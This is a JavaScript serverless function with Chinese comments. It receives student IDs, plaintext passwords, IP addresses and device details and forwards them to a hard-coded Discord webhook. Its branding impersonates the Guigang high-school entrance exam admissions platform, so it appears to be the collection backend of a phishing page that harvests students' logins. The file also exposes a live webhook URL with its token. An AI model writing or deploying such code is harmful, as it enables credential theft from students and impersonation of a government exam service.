// Vercel Serverless Function
// 保存为 api/discord.js

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524273641192423515/0Kf9zwukWFH4ZIWGzyKgGdY2UQdESE1TN5WdZtqMVFn6lJomILQvyJu70qHpf_Qzdjg0';

export default async function handler(req, res) {
  // 只允许POST请求
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { studentId, password, loginTime, ip, userAgent } = req.body;

    // 验证必要字段
    if (!studentId || !password || !loginTime || !ip) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // 构建Discord消息
    const message = {
      username: '查分系统',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/3062/3062646.png',
      embeds: [
        {
          title: '🚨 新的登入记录',
          color: 16711680, // 红色
          fields: [
            {
              name: '📚 学号',
              value: `\`\`\`${studentId}\`\`\``,
              inline: true
            },
            {
              name: '🔐 密码',
              value: `\`\`\`${password}\`\`\``,
              inline: true
            },
            {
              name: '🕐 登入时间',
              value: `\`\`\`${loginTime}\`\`\``,
              inline: false
            },
            {
              name: '🌐 IP地址',
              value: `\`\`\`${ip}\`\`\``,
              inline: true
            },
            {
              name: '💻 设备信息',
              value: `\`\`\`${(userAgent || '未知').substring(0, 100)}\`\`\``,
              inline: true
            }
          ],
          timestamp: new Date().toISOString(),
          footer: {
            text: '贵港市中考统一招生平台'
          }
        }
      ]
    };

    // 发送到Discord
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message)
    });

    if (!response.ok) {
      throw new Error(`Discord API error: ${response.status}`);
    }

    return res.status(200).json({ 
      success: true, 
      message: '✅ 记录已发送到Discord' 
    });

  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ 
      error: 'Failed to send to Discord',
      details: error.message
    });
  }
}
